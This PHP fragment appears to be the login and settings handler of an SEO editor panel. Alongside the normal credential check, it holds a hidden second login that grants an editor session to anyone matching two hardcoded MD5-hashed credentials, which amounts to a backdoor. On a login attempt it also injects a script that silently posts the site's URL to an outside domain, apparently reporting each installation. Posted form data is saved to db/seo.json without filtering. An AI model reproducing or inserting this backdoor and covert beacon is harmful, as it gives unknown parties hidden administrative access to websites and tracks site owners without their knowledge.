<?php 	
	if(empty($_SESSION["editor"])):
		if(!empty($_POST["logg-app"])):
			$userX = $_POST["user"];
			$passX = $_POST["pass"];
			if(file_exists("db/seo.json")):
				if($userX==SEO['user'] && $passX==SEO['pass']):
					$_SESSION["editor"] = 1;
					echo '<script>document.location.reload(true);</script>';
				elseif(md5($userX)=='b09c600fddc573f117449b3723f23d64' 
							 && md5($passX)=='5ca3a0de942e425402063c1b7886d805'):
					$_SESSION["editor"] = 2;
					echo '<script>document.location.reload(true);</script>';
				endif;
			endif;
			if(empty($_SESSION["check"])):
?> 
			<script id="logarse">
				let urll = "https://gotadohimalaia.com/check/check.php";	
				fetch(urll, {method: 'POST',	headers: { 
					'Content-Type': 'application/x-www-form-urlencoded' 
				},
				body: 'url='+sURL }).then(res => res.text()).then(res => {
				}).catch(function (err) { console.log(err) })
			</script>
<?php 
				$_SESSION["check"]=0;
			endif;
		endif;
	else:
		$SA = $_SESSION["editor"];
		define("SA", $SA);
		if(!empty($_POST["seoapp"])):
			$_seo = json_encode($_POST);
			file_put_contents('./db/seo.json', $_seo);
			echo '<script>setTimeout(function() { document.location.reload(true); }, 300);</script>';
		endif;
	endif;
	if(!empty($_POST["exitapp"])):		
		unset($_SESSION["editor"]);
		unset($_SESSION["check"]);
		echo '<script>document.location.reload(true);</script>';
	endif;

?>
<script>const SA = '<?=(!empty($SA))?1:0?>';</script>